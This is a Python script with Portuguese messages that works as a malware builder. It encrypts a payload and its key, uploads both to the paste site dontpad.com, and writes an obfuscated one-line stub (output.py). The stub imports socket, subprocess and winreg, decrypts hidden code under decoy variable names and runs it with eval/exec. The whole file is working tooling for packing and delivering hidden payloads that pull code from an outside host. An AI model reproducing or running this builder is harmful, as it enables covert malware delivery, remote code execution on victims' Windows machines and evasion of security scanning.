from cryptography.fernet import Fernet
import os
import requests

dontpad = "http://dontpad.com/"

print("[*] Endpoint do payload:")
filepayload = input(f"[?] {dontpad}")

print("[*] Endpoint da key:")
filekey = input(f"[?] {dontpad}")

print("[+] Gerando key")
key = Fernet.generate_key()

print("[+] Salvando key")
keytxt = open('hack.key', 'wb')
keytxt.write(key)
keytxt.close()
print(f"[+] key salva em {os.getcwd()}\\hack.key")

print(f"[+] Enviando key para {dontpad}{filekey}")
requests.post(f'{dontpad}{filekey}', {'text': key.decode()})

cipher_suite = Fernet(key)

print("[+] Lendo payload.txt")
txt = open('payload.txt', 'rb')
print("[+] Codificando payload")
encrypted_payload = cipher_suite.encrypt(txt.read())
txt.close()

print(f"[+] Enviando payload encriptado para {dontpad}{filepayload}")
requests.post(f'{dontpad}{filepayload}', {'text': encrypted_payload.decode()})

print("[+] Lendo encrypted_model.txt")
txt2 = open('encrypted_model.txt', 'rb')
md1 = txt2.read().replace(b'FILEPAYLOAD', filepayload.encode())
md2 = md1.replace(b'FILEKEY', filekey.encode())
model_encrypted = md2
txt2.close()

print("[+] Codificando modelo modificado")
key2 = Fernet.generate_key()
cipher_suite2 = Fernet(key2)
encrypted_final = cipher_suite2.encrypt(model_encrypted)
print("[+] Criando arquivo final codificado")
txt3 = open('output.py', 'wb')
txt3.write(f"from cryptography.fernet import Fernet; "
           f"import socket; "
           f"import os; "
           f"import platform; "
           f"import subprocess; "
           f"from time import sleep; "
           f"import requests; "
           f"from threading import Thread; "
           f"from sys import argv; "
           f"import winreg; "
           f"email={key2}; "
           f"nome={encrypted_final}; "
           f"sobrenome=Fernet(email).decrypt(nome); "
           f"eval('exec('+str(sobrenome)+')')".encode())
txt3.close()
print(f"[+] Arquivo final salvo em {os.getcwd()}\\output.py")
